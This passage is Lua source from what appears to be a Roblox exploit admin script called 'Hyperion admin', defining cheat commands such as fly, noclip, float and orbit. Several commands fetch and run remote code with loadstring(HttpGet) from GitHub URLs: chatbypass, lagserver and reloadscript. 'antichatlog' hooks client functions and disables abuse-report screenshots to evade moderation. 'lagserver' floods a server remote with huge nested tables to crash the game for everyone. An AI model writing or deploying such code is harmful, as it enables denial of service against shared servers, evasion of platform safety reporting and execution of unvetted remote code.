				BodyGyro.CFrame = CoordinateFrame * CFrame.Angles(-rad(Speed * 15), 0, 0);
			end
			if (Keys["A"]) then
				NewPos = NewPos * CFrameNew(-Speed, 0, 0);
			end
			if (Keys["S"]) then
				NewPos = NewPos - CoordinateFrame.lookVector * Speed

				BodyPos.Position = (GetRoot().CFrame * CFrameNew(0, 0, Speed)).Position;
				BodyGyro.CFrame = CoordinateFrame * CFrame.Angles(-rad(Speed * 15), 0, 0);
			end
			if (Keys["D"]) then
				NewPos = NewPos * CFrameNew(Speed, 0, 0);
			end
			BodyPos.Position = NewPos.Position
			BodyGyro.CFrame = CoordinateFrame
		end
		GetHumanoid().PlatformStand = false
	end)();
end)

AddCommand("flyspeed", {"fs"}, "changes the fly speed", {3, "1"}, function(Caller, Args)
	local Speed = tonumber(Args[1]);
	LoadCommand("fly").CmdEnv[1] = Speed 
	if (Speed) then
		SetConfig({FlySpeed=Speed});
		return "Your flyspeed is now " .. Speed
	else
		return "Flyspeed must be a number."
	end
end)

AddCommand("unfly", {}, "unflies your character", {3}, function()		
	LoadCommand("fly").CmdEnv = {}
	local Root = GetRoot();
	local Instances = { ["BodyPosition"] = true, ["BodyGyro"] = true, ["BodyVelocity"] = true }
	for i, v in next, GetChildren(Root) do
		if (Instances[v.ClassName]) then
			Destroy(v);
		end
	end
	UnSpoofInstance(Root);
	GetHumanoid().PlatformStand = false
end)

AddCommand("float", {}, "floats your character", {}, function(Caller, Args, CEnv)
	if (not CEnv[1]) then
		local Part = InstanceNew("Part");
		Part.CFrame = CFrameNew(0, -10000, 0);
		Part.Size = Vector3New(2, .2, 1.5);
		Part.Material = "Grass"
		Part.Anchored = true
		Part.Transparency = 1
		ProtectInstance(Part);
		Part.Parent = Services.Workspace
		CEnv[2] = Part
		local R6 = isR6();
		local Root = GetRoot();
		AddConnection(CConnect(RenderStepped, function()
			if (CEnv[1] and Root) then
				Part.CFrame = Root.CFrame * CFrameNew(0, -3.1, 0);
			else
				Part.CFrame = CFrameNew(0, -10000, 0);
				Root = GetRoot();
			end
			if (Keys["Q"]) then
				Root.CFrame = Root.CFrame * CFrameNew(0, -1.5, 0);
			elseif (Keys["E"]) then
				Root.CFrame = Root.CFrame * CFrameNew(0, 1.5, 0);
			end
		end), CEnv)
		Utils.Notify(Caller, "Float", "Enabled!");
	end
end)

AddCommand("unfloat", {"nofloat"}, "stops float", {}, function(Caller, Args, CEnv)
	local Floating = LoadCommand("float").CmdEnv
	if (Floating[1]) then
		Disconnect(Floating[1]);
		Destroy(Floating[2]);
		LoadCommand("float").CmdEnv = {}
		Utils.Notify(Caller, "Float", "Disabled!");
	end
end)

AddCommand("fov", {}, "sets your fov", {}, function(Caller, Args)
	local Amount = tonumber(Args[1]) or 70
	SpoofProperty(Camera, "FieldOfView");
	Camera.FieldOfView = Amount
	Utils.Notify(Caller, "Fov", "Fov set to "..Amount)
end)

AddCommand("noclip", {}, "noclips your character", {3}, function(Caller, Args, CEnv)
	local Char = GetCharacter()
	local Noclipping = AddConnection(CConnect(Stepped, function()
		for i, v in next, GetChildren(Char) do
			if (IsA(v, "BasePart") and v.CanCollide) then
				SpoofProperty(v, "CanCollide");
				v.CanCollide = false
			end
		end
	end), CEnv);
	local Torso = isR6() and Char.Torso or Char.UpperTorso
	local Noclipping2 = AddConnection(CConnect(Torso.Touched, function(Part)
		if (Part and Part.CanCollide and not FindFirstChildWhichIsA(Part.Parent, "Humanoid")) then
			local OldTransparency = Part.Transparency
			Part.CanCollide = false
			Part.Transparency = Part.Transparency <= 0.5 and 0.6 or Part.Transparency
			wait(2);
			Part.CanCollide = true
			Part.Transparency = OldTransparency
		end
	end), CEnv);
	Utils.Notify(Caller, "Noclip", "Enabled!");
	CWait(GetHumanoid().Died);
	DisableAllCmdConnections("noclip");
	Utils.Notify(Caller, "Noclip", "Disabled!");
end)

AddCommand("clip", {"unnoclip"}, "disables noclip", {}, function(Caller, Args)
	if (not next(LoadCommand("noclip").CmdEnv)) then
		Utils.Notify(Caller, "Noclip", "Already clipped!");
	else
		DisableAllCmdConnections("noclip");
		Utils.Notify(Caller, "Noclip", "Disabled!");
	end
end)

AddCommand("chatbypass", {}, "bypasses chat filter", {}, function(Caller)
	loadstring(game:HttpGet("https://raw.githubusercontent.com/synnyyy/synergy/additional/betterbypasser", true))({
    Method = 1, -- Method 1 is the main method. Method two is emojis. Method 3 is full transparency, no special symbols. Method 3 has been improved!
    Keybind = "F", -- Usually defaulted to F. You can change this keybind by replacing the string with a letter. Works for uppercase and lowercase.
    ShowMethodDictionary = true -- Shows you the full list of words that you can say with the method. Press FN + F9 to see this dictionary.
})
end)

AddCommand("antichatlog", {}, "blocks roblox from logging your chat", {}, function(Caller)
	
	if not game:IsLoaded() then
		game.Loaded:wait()
	end

	local ACL_LoadTime = tick()

	local OldCoreTypeSettings = {}
	local WhitelistedCoreTypes = {
		"Chat",
		"All",
		Enum.CoreGuiType.Chat,
		Enum.CoreGuiType.All
	}

	local OldCoreSetting = nil

	local CoreGui = game:GetService("CoreGui")
	local StarterGui = game:GetService("StarterGui")
	local TweenService = game:GetService("TweenService")
	local TextChatService = game:GetService("TextChatService")
	local Players = game:GetService("Players")

	local Player = Players.LocalPlayer

	local PlayerGui = Player:FindFirstChildWhichIsA("PlayerGui") do
		if not PlayerGui then
			repeat task.wait() until Player:FindFirstChildWhichIsA("PlayerGui")
			PlayerGui = Player:FindFirstChildWhichIsA("PlayerGui")
		end
	end

	
	local Tween = function(Object, Time, Style, Direction, Property)
		return TweenService:Create(Object, TweenInfo.new(Time, Enum.EasingStyle[Style], Enum.EasingDirection[Direction]), Property)
	end

	local Metatable = getrawmetatable(StarterGui)
	setreadonly(Metatable, false)

	local CoreHook do
		if hookmetamethod then
			CoreHook = hookmetamethod(StarterGui, "__namecall", newcclosure(function(self, ...)
				local Method = getnamecallmethod()
				local Arguments = {...}

				if self == StarterGui and not checkcaller() then
					if Method == "SetCoreGuiEnabled" then
						local CoreType = Arguments[1]
						local Enabled = Arguments[2]

						if table.find(WhitelistedCoreTypes, CoreType) and not Enabled then
							OldCoreTypeSettings[CoreType] = Enabled
							return
						end
					elseif Method == "SetCore" then
						local Core = Arguments[1]
						local Connection = Arguments[2]

						if Core == "CoreGuiChatConnections" then
							OldCoreSetting = Connection
							return
						end
					end
				end

				return CoreHook(self, ...)
			end))
		end
	end

	local EnabledChat = task.spawn(function()
		repeat
			StarterGui:SetCoreGuiEnabled(Enum.CoreGuiType.Chat, true)
			task.wait()
		until StarterGui:GetCoreGuiEnabled(Enum.CoreGuiType.Chat)
	end)

	local WarningGuiThread = task.spawn(function()
		WarningUI = Instance.new("ScreenGui")
		Main = Instance.new("Frame")
		BackgroundHolder = Instance.new("Frame")
		Background = Instance.new("Frame")
		TopBar = Instance.new("Frame")
		UIGradient = Instance.new("UIGradient")
		TitleHolder = Instance.new("Frame")
		Title = Instance.new("TextLabel")
		Holder = Instance.new("Frame")
		UIListLayout = Instance.new("UIListLayout")
		Reason_1 = Instance.new("TextLabel")
		Reason_2 = Instance.new("TextLabel")
		Reason_3 = Instance.new("TextLabel")
		WarningText = Instance.new("TextLabel")
		Exit = Instance.new("TextButton")
		ImageLabel = Instance.new("ImageLabel")

		if syn then
			syn.protect_gui(WarningUI)
		end

		WarningUI.Enabled = false
		WarningUI.Name = "WarningUI"
		WarningUI.Parent = CoreGui

		Main.Name = "Main"
		Main.Parent = WarningUI
		Main.AnchorPoint = Vector2.new(.5, .5)
		Main.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
		Main.BackgroundTransparency = 1
		Main.Position = UDim2.new(.5, 0, .5, 0)
		Main.Size = UDim2.new(0, 400, 0, 400)

		BackgroundHolder.Name = "BackgroundHolder"
		BackgroundHolder.Parent = Main
		BackgroundHolder.BackgroundColor3 = Color3.fromRGB(20, 20, 20)
		BackgroundHolder.BackgroundTransparency = .25
		BackgroundHolder.BorderSizePixel = 0
		BackgroundHolder.Size = UDim2.new(1, 0, 1, 0)

		Background.Name = "Background"
		Background.Parent = BackgroundHolder
		Background.AnchorPoint = Vector2.new(.5, .5)
		Background.BackgroundColor3 = Color3.fromRGB(20, 20, 20)
		Background.BorderSizePixel = 0
		Background.Position = UDim2.new(.5, 0, .5, 0)
		Background.Size = UDim2.new(.96, 0, .96, 0)

		TopBar.Name = "TopBar"
		TopBar.Parent = Background
		TopBar.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
		TopBar.BorderSizePixel = 0
		TopBar.Size = UDim2.new(1, 0, 0, 2)

		UIGradient.Color = ColorSequence.new{ColorSequenceKeypoint.new(0, Color3.fromRGB(53, 149, 146)), ColorSequenceKeypoint.new(.29, Color3.fromRGB(93, 86, 141)), ColorSequenceKeypoint.new(.50, Color3.fromRGB(126, 64, 138)), ColorSequenceKeypoint.new(.75, Color3.fromRGB(143, 112, 112)), ColorSequenceKeypoint.new(1, Color3.fromRGB(159, 159, 80))}
		UIGradient.Parent = TopBar

		TitleHolder.Name = "TitleHolder"
		TitleHolder.Parent = Background
		TitleHolder.AnchorPoint = Vector2.new(.5, .5)
		TitleHolder.BackgroundColor3 = Color3.fromRGB(20, 20, 20)
		TitleHolder.BorderColor3 = Color3.fromRGB(44, 44, 44)
		TitleHolder.BorderSizePixel = 2
		TitleHolder.Position = UDim2.new(.5, 0, .5, 0)
		TitleHolder.Size = UDim2.new(.9, 0, .9, 0)

		Title.Name = "Title"
		Title.Parent = TitleHolder
		Title.BackgroundColor3 = Color3.fromRGB(20, 20, 20)
		Title.BorderSizePixel = 0
		Title.Position = UDim2.new(0, 15, 0, -12)
		Title.Size = UDim2.new(0, 75, 0, 20)
		Title.Font = Enum.Font.SourceSansBold
		Title.Text = "Warning"
		Title.TextColor3 = Color3.fromRGB(235, 235, 235)
		Title.TextScaled = true
		Title.TextWrapped = true

		Holder.Name = "Holder"
		Holder.Parent = TitleHolder
		Holder.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
		Holder.BackgroundTransparency = 1
		Holder.Position = UDim2.new(0, 30, .125, 0)
		Holder.Size = UDim2.new(1, -30, .875, 0)

		UIListLayout.Parent = Holder
		UIListLayout.SortOrder = Enum.SortOrder.LayoutOrder

		Reason_1.Name = "Reason_1"
		Reason_1.Parent = Holder
		Reason_1.BackgroundColor3 = Color3.fromRGB(20, 20, 20)
		Reason_1.BackgroundTransparency = 1
		Reason_1.BorderSizePixel = 0
		Reason_1.Size = UDim2.new(1, 0, 0, 20)
		Reason_1.Font = Enum.Font.SourceSans
		Reason_1.Text = "- TextChatService is enabled"
		Reason_1.TextColor3 = Color3.fromRGB(199, 40, 42)
		Reason_1.TextScaled = true
		Reason_1.TextWrapped = true
		Reason_1.TextXAlignment = Enum.TextXAlignment.Left
		Reason_1.Visible = false

		Reason_2.Name = "Reason_2"
		Reason_2.Parent = Holder
		Reason_2.BackgroundColor3 = Color3.fromRGB(20, 20, 20)
		Reason_2.BackgroundTransparency = 1
		Reason_2.BorderSizePixel = 0
		Reason_2.Size = UDim2.new(1, 0, 0, 20)
		Reason_2.Font = Enum.Font.SourceSans
		Reason_2.Text = "- Legacy chat module was not found"
		Reason_2.TextColor3 = Color3.fromRGB(199, 40, 42)
		Reason_2.TextScaled = true
		Reason_2.TextWrapped = true
		Reason_2.TextXAlignment = Enum.TextXAlignment.Left
		Reason_2.Visible = false

		Reason_3.Name = "Reason_3"
		Reason_3.Parent = Holder
		Reason_3.BackgroundColor3 = Color3.fromRGB(20, 20, 20)
		Reason_3.BackgroundTransparency = 1
		Reason_3.BorderSizePixel = 0
		Reason_3.Size = UDim2.new(1, 0, 0, 20)
		Reason_3.Font = Enum.Font.SourceSans
		Reason_3.Text = "- MessagePosted function was not found"
		Reason_3.TextColor3 = Color3.fromRGB(199, 40, 42)
		Reason_3.TextScaled = true
		Reason_3.TextWrapped = true
		Reason_3.TextXAlignment = Enum.TextXAlignment.Left
		Reason_3.Visible = false

		WarningText.Name = "WarningText"
		WarningText.Parent = TitleHolder
		WarningText.BackgroundColor3 = Color3.fromRGB(20, 20, 20)
		WarningText.BackgroundTransparency = 1
		WarningText.BorderSizePixel = 0
		WarningText.Position = UDim2.new(0, 30, .05, 0)
		WarningText.RichText = true
		WarningText.Size = UDim2.new(1, -30, 0, 20)
		WarningText.Font = Enum.Font.SourceSans
		WarningText.Text = "> Anti-<font color=\"#6ea644\">Chat Logger</font> will not work here!"
		WarningText.TextColor3 = Color3.fromRGB(255, 255, 255)
		WarningText.TextScaled = true
		WarningText.TextWrapped = true
		WarningText.TextXAlignment = Enum.TextXAlignment.Left

		Exit.Name = "Exit"
		Exit.Parent = TitleHolder
		Exit.AnchorPoint = Vector2.new(.5, .5)
		Exit.BackgroundColor3 = Color3.fromRGB(36, 36, 36)
		Exit.BorderColor3 = Color3.fromRGB(0, 0, 0)
		Exit.Position = UDim2.new(.5, 0, .899999976, 0)
		Exit.Size = UDim2.new(0, 250, 0, 20)
		Exit.Font = Enum.Font.SourceSans
		Exit.Text = "Ok"
		Exit.TextColor3 = Color3.fromRGB(255, 255, 255)
		Exit.TextScaled = true
		Exit.TextWrapped = true

		ImageLabel.Parent = TitleHolder
		ImageLabel.AnchorPoint = Vector2.new(.5, .5)
		ImageLabel.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
		ImageLabel.BackgroundTransparency = 1
		ImageLabel.Position = UDim2.new(.5, 0, .6, 0)
		ImageLabel.Size = UDim2.new(.3, 0, .3, 0)
		ImageLabel.ZIndex = 1
		ImageLabel.Image = "rbxassetid://12969025384"
		ImageLabel.ImageColor3 = Color3.fromRGB(40, 40, 40)
		ImageLabel.ImageTransparency = .5

		Exit.MouseButton1Down:Connect(function()
			WarningUI:Destroy()
		end)
	end)

	if TextChatService.ChatVersion == Enum.ChatVersion.TextChatService then
		WarningUI.Enabled = true
		Reason_1.Visible = true
		return
	end

	local PlayerScripts = Player:WaitForChild("PlayerScripts")
	local ChatMain = PlayerScripts:FindFirstChild("ChatMain", true) or false

	if not ChatMain then
		local Timer = tick()

		repeat task.wait() until PlayerScripts:FindFirstChild("ChatMain", true) or tick() > (Timer + 3)
		ChatMain = PlayerScripts:FindFirstChild("ChatMain", true)

		if not ChatMain then
			WarningUI.Enabled = true
			Reason_2.Visible = true
			return
		end
	end

	local PostMessage = require(ChatMain).MessagePosted

	if not PostMessage then
		WarningUI.Enabled = true
		Reason_3.Visible = true
		return
	end

	local MessageEvent = Instance.new("BindableEvent")
	local OldFunctionHook; OldFunctionHook = hookfunction(PostMessage.fire, function(self, Message)
		if self == PostMessage then
			MessageEvent:Fire(Message)
			return
		end
		return OldFunctionHook(self, Message)
	end)

	if setfflag then
		setfflag("AbuseReportScreenshot", "False")
		setfflag("AbuseReportScreenshotPercentage", "0")
	end -- To prevent roblox from taking screenshots of your client.

	local Credits = task.spawn(function()
		local UserIds = {
			1414978355,
			3314699734
		}

		if table.find(UserIds, Player.UserId) then
			return
		end

		local Tag = Instance.new("BillboardGui")
		local Title = Instance.new("TextLabel", Tag)
		local Rank = Instance.new("TextLabel", Tag)
		local Gradient = Instance.new("UIGradient", Title)

		Tag.Brightness = 2
		Tag.Size = UDim2.new(4, 0, 1, 0)
		Tag.StudsOffsetWorldSpace = Vector3.new(0, 4, 0)

		Title.BackgroundTransparency = 1
		Title.Size = UDim2.new(1, 0, .6, 0)
		Title.TextColor3 = Color3.fromRGB(255, 255, 255)
		Title.TextScaled = true

		Rank.AnchorPoint = Vector2.new(.5, 0)
		Rank.BackgroundTransparency = 1
		Rank.Position = UDim2.new(.5, 0, .65, 0)
		Rank.Size = UDim2.new(1, 0, .5, 0)
		Rank.TextColor3 = Color3.fromRGB(0, 0, 0)
		Rank.TextScaled = true
		Rank.Text = "< Owner >"

		Gradient.Color = ColorSequence.new({
			ColorSequenceKeypoint.new(0, Color3.new(.75, .75, .75)),
			ColorSequenceKeypoint.new(.27, Color3.new(0, 0, 0)),
			ColorSequenceKeypoint.new(.5, Color3.new(.3, 0, .5)),
			ColorSequenceKeypoint.new(0.78, Color3.new(0, 0, 0)),
			ColorSequenceKeypoint.new(1, Color3.new(.75, .75, .75))
		})
		Gradient.Offset = Vector2.new(-1, 0)

		local GradientTeen = Tween(Gradient, 2, "Circular", "Out", {Offset = Vector2.new(1, 0)})

		function PlayAnimation()
			GradientTeen:Play()
			GradientTeen.Completed:Wait()
			Gradient.Offset = Vector2.new(-1, 0)
			task.wait(.75)
			PlayAnimation()
		end

		local AddTitle = function(Character)
			repeat task.wait() until Character

			local Humanoid = Character and Character:WaitForChild("Humanoid")
			local RootPart = Humanoid and Humanoid.RootPart

			if Humanoid then
				Humanoid:GetPropertyChangedSignal("RootPart"):Connect(function()
					if Humanoid.RootPart then
						Tag.Adornee = RootPart
					end
				end)
			end

			if RootPart then
				Tag.Adornee = RootPart
			end
		end

		task.spawn(PlayAnimation)

		for _, x in next, Players:GetPlayers() do
			if table.find(UserIds, x.UserId) then
				Tag.Parent = workspace.Terrain
				Title.Text = x.Name
				AddTitle(x.Character)
				x.CharacterAdded:Connect(AddTitle)
			end
		end

		Players.PlayerAdded:Connect(function(x)
			if table.find(UserIds, x.UserId) then
				Tag.Parent = workspace.Terrain
				Title.Text = x.Name
				x.CharacterAdded:Connect(AddTitle)
			end
		end)

		Players.PlayerRemoving:Connect(function(x)
			if table.find(UserIds, x.UserId) then
				Tag.Parent = game
			end
		end)
	end)

	task.delay(1, function() WarningUI:Destroy() end)

	for _, x in next, OldCoreTypeSettings do
		if not x then
			StarterGui:SetCore("ChatActive", false)
		end
		StarterGui:SetCoreGuiEnabled(_, x)
	end

	if OldCoreSetting then
		StarterGui:SetCore("CoreGuiChatConnections", OldCoreSetting)
	end

	if StarterGui:GetCore("ChatActive") then
		StarterGui:SetCore("ChatActive", false)
		StarterGui:SetCore("ChatActive", true)
	end

	--Metatable.__namecall = CoreHook
	if CoreHook then
		setmetatable(Metatable, {__namecall = CoreHook}) 
	end
	setreadonly(Metatable, true)
	
	Utils.Notify(Caller, "AntiChatLog", "Anti Chat and Screenshot Logger Loaded!")
end)

AddCommand("clearconsole", {}, "clears console errors", {}, function()
local a=Instance.new("Animation")
a.AnimationId="rbxassetid://"..tostring(math.random(1,10^9))..[[)
╔══════════════╗
















































╚══════════════╝
]]
game.Players.LocalPlayer.Character.Humanoid:LoadAnimation(a):Play(0.1,0.1,0.1)
end)

AddCommand("consolemsg", {}, "makes a message appear in the console", {}, function(Args)
local msg = concat(Args, " ");	
local a=Instance.new("Animation")
a.AnimationId="rbxassetid://"..tostring(math.random(1,10^9))..[[)
╔══════════════╗]]

		
		
..msg



--╚══════════════╝
--]]
game.Players.LocalPlayer.Character.Humanoid:LoadAnimation(a):Play(0.1,0.1,0.1)
end)

AddCommand("errorchat", {}, "makes the chat error appear", {}, function()
	for i=1,3 do 
		game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer("\0", "All")
	end
end)

AddCommand("chat", {}, "sends a message", {"1"}, function(Caller, Args)
	local ChatRemote = Services.ReplicatedStorage.DefaultChatSystemChatEvents.SayMessageRequest
	local toChat = concat(Args, " ");
	ChatRemote.FireServer(ChatRemote, toChat, "All");
	return "Chatted " .. toChat
end)

AddCommand("silentchat", {}, "sends a message but will not show in the chat (fires .Chatted signals)", {"1"}, function(Caller, Args)
	local toChat = concat(Args, " ");
	Services.Players.Chat(Services.Players, toChat);
	return "Silent chatted " .. toChat
end)

AddCommand("leave", {}, "leaves the game you're currently in", {}, function(Caller)
	game:GetService("Players").LocalPlayer:Kick()
	wait()
	game:Shutdown()
end)

AddCommand("rejoin", {"rj"}, "rejoins the game you're currently in", {}, function(Caller)
	if (Caller == LocalPlayer) then		
		Services.TeleportService.Teleport(Services.TeleportService, game.PlaceId);
		return "Rejoining..."
	else
		return "Can't rejoin server."
	end
end)

AddCommand("lagserver", {}, "lags the entire server", {}, function(Caller)
	if game.PlaceId == 920587237 or game.PlaceId == 606849621 or game.PlaceId == 9103898828 or game.PlaceId == 5130598377 or game.PlaceId == 6804602922 then
		select(2, pcall(loadstring, game:HttpGet("https://raw.githubusercontent.com/daily3014/scripts/master/lagger.lua")))() 
	else

		local char = game:GetService('Players').LocalPlayer.Character or nil
		if char then
			char.HumanoidRootPart.CFrame = CFrame.new(0,9e9,0)
			task.wait(0.5)
			char.HumanoidRootPart.Anchored = true
		end
		while wait(1.5) do --// don't change it's the best
			game:GetService("NetworkClient"):SetOutgoingKBPSLimit(math.huge)
			local function getmaxvalue(val)
				local mainvalueifonetable = 499999
				if type(val) ~= "number" then
					return nil
				end
				local calculateperfectval = (mainvalueifonetable/(val+2))
				return calculateperfectval
			end

			local function bomb(tableincrease, tries)
				local maintable = {}
				local spammedtable = {}

				table.insert(spammedtable, {})
				z = spammedtable[1]

				for i = 1, tableincrease do
					local tableins = {}
					table.insert(z, tableins)
					z = tableins
				end

				local calculatemax = getmaxvalue(tableincrease)
				local maximum

				if calculatemax then
					maximum = calculatemax
				else
					maximum = 999999
				end

				for i = 1, maximum do
					table.insert(maintable, spammedtable)
				end

				for i = 1, tries do
					game.RobloxReplicatedStorage.SetPlayerBlockList:FireServer(maintable)
				end
			end

			bomb(289, 5)
		end
	end
end)

AddCommand("serverhop", {"shop"}, "switches servers (optional: min, max (default: max))", {{"min", "max"}}, function(Caller, Args)
	if (Caller == LocalPlayer) then
		Utils.Notify(Caller or LocalPlayer, "Command", "Looking for servers...");
		local order = ""
		local Option, Server = lower(Args[1] or "max");
		if Option == "min" then
			order = "Asc"
		elseif Option == "max" then
			order = "Desc"
		end;

		local Servers = {};
		local url = format("https://games.roblox.com/v1/games/%s/servers/Public?sortOrder=%s&limit=100", game.PlaceId, order);
		local starting = tick();
		repeat
			local good, result = pcall(function()
				return game:HttpGet(url);
			end);
			if (not good) then
				wait(2);
				continue;
			end
			local decoded = Services.HttpService:JSONDecode(result);
			if (#decoded.data ~= 0) then
				Servers = decoded.data
				for i, v in pairs(Servers) do
					if (v.maxPlayers and v.playing and v.maxPlayers > v.playing) then
						Server = v
						break;
					end
				end
				if (Server) then
					break;
				end
			end
			url = format("https://games.roblox.com/v1/games/%s/servers/Public?sortOrder=%s&limit=100&cursor=%s", game.PlaceId, order, decoded.nextPageCursor);
		until tick() - starting >= 600;
		if (not Server or #Servers == 0) then
			return "No servers found.";
		end

		local queue_on_teleport = syn and syn.queue_on_teleport or queue_on_teleport
		if (queue_on_teleport and not Args[2]) then			
		end;

		Services.TeleportService:TeleportToPlaceInstance(game.PlaceId, Server.id);    
		return format("Joining server (%d/%d players)", Server.playing, Server.maxPlayers);
	end
end);

local CommandsLoaded = false
AddCommand("commandlist", {"cmds"}, "shows you all the commands listed in Hyperion admin", {}, function()
	if (not CommandsLoaded) then
		local CommandsList = Commands.Frame.List
		Utils.SmoothScroll(CommandsList, .14);
		for _, v in next, CommandsTable do
			if (not FindFirstChild(CommandsList, v.Name)) then
				local Clone = Clone(Command)
				Utils.Hover(Clone, "BackgroundColor3");
				Utils.ToolTip(Clone, v.Name .. "\n" .. v.Description);
				Clone.CommandText.Text = v.Name .. (#v.Aliases > 0 and " (" ..concat(v.Aliases, ", ") .. ")" or "");
				Clone.Name = v.Name
				Clone.Visible = true
				Clone.Parent = CommandsList
			end
		end
		Commands.Frame.List.CanvasSize = UDim2.fromOffset(0, Commands.Frame.List.UIListLayout.AbsoluteContentSize.Y);
		CommandsTransparencyClone = Clone(Commands);
		Utils.SetAllTrans(Commands)
		CommandsLoaded = true
	end
	Commands.Visible = true
	Utils.TweenAllTransToObject(Commands, .25, CommandsTransparencyClone);
	Utils.Notify(Caller, "Commandlist", "Loaded!")
end)

AddCommand("unload", {}, "kills the script", {}, function(Caller)
	if (Caller == LocalPlayer) then
		deepsearch(Connections, function(i,v)
			if (type(v) == 'userdata' and v.Disconnect) then
				Disconnect(v);
			elseif (type(v) == 'boolean') then
				v = false
			end
		end);
		for i, v in next, Hooks.SpoofedProperties do
			for i2, v2 in next, v do
				i[v2.Property] = v2.SpoofedProperty[v2.Property]
			end
		end
		for i, v in next, Hooks do
			if (type(v) == 'boolean') then
				v = false
			end
			if (type(v) == 'function') then

			end
		end
		Destroy(UI);
		getgenv().F_A = nil
		setreadonly(mt, false);
		mt = OldMetaMethods
		setreadonly(mt, true);
		for i, v in next, getfenv() do
			getfenv()[i] = nil
		end
	end
end)

AddCommand("reloadscript", {}, "kills the script and reloads it", {}, function(Caller)
	if (Caller == LocalPlayer) then
		ExecuteCommand("unload", {}, LocalPlayer);
		loadstring(game:HttpGet("https://raw.githubusercontent.com/LighTMolT/wdawdv/main/Test"))();
	end
end)

AddCommand("commandline", {"cmd", "cli"}, "brings up a cli, can be useful for when games detect by textbox", {}, function()
	if (not _L.CLI) then
		_L.CLI = true
		while true do
			rconsoleprint("@@WHITE@@");
			rconsoleprint("CMD >");
			local Input = rconsoleinput("");
			local CommandArgs = split(Input, " ");
			local Command = LoadCommand(CommandArgs[1]);
			local Args = shift(CommandArgs);
			if (Command and CommandArgs[1] ~= "") then
				if (Command.ArgsNeeded > #Args) then
					rconsoleprint("@@YELLOW@@");
					return rconsoleprint(format("Insuficient Args (you need %d)\n", Command.ArgsNeeded));
				end

				local Success, Err = pcall(function()
					local Executed = Command.Function()(LocalPlayer, Args, Command.CmdEnv);
					if (Executed) then
						rconsoleprint("@@GREEN@@");
						rconsoleprint(Executed .. "\n");
					end
					if (#LastCommand == 3) then
						LastCommand = shift(LastCommand);
					end
					LastCommand[#LastCommand + 1] = {Command, plr, Args, Command.CmdEnv}
				end);
				if (not Success and Debug) then
					rconsoleerr(Err);
				end
			else
				rconsolewarn("Couldn't find the command " .. CommandArgs[1] .. "\n");
			end
		end
	end
end)

AddCommand("setprefix", {}, "changes your prefix", {"1"}, function(Caller, Args)
	local PrefixToSet = Args[1]
	if (match(PrefixToSet, "%A")) then
		Prefix = PrefixToSet
		Utils.Notify(Caller, "Command", format("your new prefix is now '%s'", PrefixToSet));
		return "Use command saveprefix to save your prefix."
	else
		return "Prefix must be a symbol."
	end
end)

AddCommand("setcommandbarprefix", {"setcprefix"}, "sets your command bar prefix to whatever you input", {}, function()
	ChooseNewPrefix = true
	local CloseNotif = Utils.Notify(LocalPlayer, "New Prefix", "Input the new prefix you would like to have", 7);
end)

AddCommand("saveprefix", {}, "saves your prefix", {}, function(Caller, Args)
	if (GetConfig().Prefix == Prefix and Enum.KeyCode[GetConfig().CommandBarPrefix] == CommandBarPrefix) then
		return "Nothing to save, prefix is the same."
	else
		SetConfig({["Prefix"]=Prefix,["CommandBarPrefix"]=split(tostring(CommandBarPrefix), ".")[3]});
		return "Saved prefix."
	end
end)

AddCommand("widebar", {}, "widens the command bar (toggle)", {}, function(Caller, Args)
	WideBar = not WideBar
	if (not Draggable) then
		Utils.Tween(CommandBar, "Quint", "Out", .5, {
			Position = UDim2.new(0.5, WideBar and -200 or -100, 1, 5) -- tween -110
		})
	end
	Utils.Tween(CommandBar, "Quint", "Out", .5, {
		Size = UDim2.new(0, WideBar and 400 or 200, 0, 35) -- tween -110
	})
	return format("Widebar %s", WideBar and "enabled" or "disabled")
end)

AddCommand("draggablebar", {"draggable"}, "makes the command bar draggable", {}, function(Caller)
	Draggable = not Draggable
	CommandBarOpen = not CommandBarOpen
	Utils.Tween(CommandBar, "Quint", "Out", .5, {
		Position = UDim2.new(0, Mouse.X, 0, Mouse.Y + 36);
	})
	Utils.Draggable(CommandBar);
	local TransparencyTween = CommandBarOpen and Utils.TweenAllTransToObject or Utils.TweenAllTrans
	local Tween = TransparencyTween(CommandBar, .5, CommandBarTransparencyClone)
	CommandBar.Input.Text = ""
	return format("Draggable command bar %s", Draggable and "enabled" or "disabled")
end)

local ToggleChatPrediction
AddCommand("chatprediction", {}, "enables command prediction on the chatbar", {}, function()
	ToggleChatPrediction();
	local ChatBar = WaitForChild(_L.Frame2, "ChatBar", .1);
	ChatBar.CaptureFocus(ChatBar);
	wait();
	ChatBar.Text = Prefix
	return "Chat prediction enabled."
end)

AddCommand("blink", {"blinkws"}, "cframe speed", {}, function(Caller, Args, CEnv)
	local Speed = tonumber(Args[1]) or 5
	local Time = tonumber(Args[2]) or .05
	LoadCommand("blink").CmdEnv[1] = Speed
	CThread(function()
		while (next(LoadCommand("blink").CmdEnv) and wait(Time)) do
			Speed = LoadCommand("blink").CmdEnv[1]
			if (Keys["W"] or Keys["A"] or Keys["S"] or Keys["D"]) then
				GetRoot().CFrame = GetRoot().CFrame + GetHumanoid().MoveDirection * Speed
			end
		end
	end)();
	Utils.Notify(Caller, "Blink", "Enabled!");
end)

AddCommand("unblink", {"noblinkws", "unblink", "noblink"}, "stops cframe speed", {}, function()
	local Blink = LoadCommand("blink").CmdEnv
	if (not next(Blink)) then
		return "Blink is already disabled."
	end
	LoadCommand("blink").CmdEnv = {}
	Utils.Notify(Caller, "Blink", "Disabled!");
end)

AddCommand("orbit", {}, "orbits a yourself around another player", {3, "1"}, function(Caller, Args, CEnv)
	local Target = GetPlayer(Args[1])[1];
	if (Target == LocalPlayer) then
		return "You cannot orbit yourself."
	end
	local Radius = tonumber(Args[3]) or 7
	local Speed = tonumber(Args[2]) or 1
	local random = random(tick() / 2, tick());
	local Root, TRoot = GetRoot(), GetRoot(Target);
	AddConnection(CConnect(Heartbeat, function()
		Root.CFrame = CFrameNew(TRoot.Position + Vector3New(sin(tick() * Speed) * Radius, 0, cos(tick() * Speed) * Radius), TRoot.Position);
	end), CEnv);
	return "Now orbiting around " .. Target.Name
end)

AddCommand("unorbit", {"noorbit"}, "unorbits yourself from the other player", {}, function()
	if (not next(LoadCommand("orbit").CmdEnv)) then
		return "You are not orbiting around someone."
	end
	DisableAllCmdConnections("orbit");
	return "Orbit stopped."
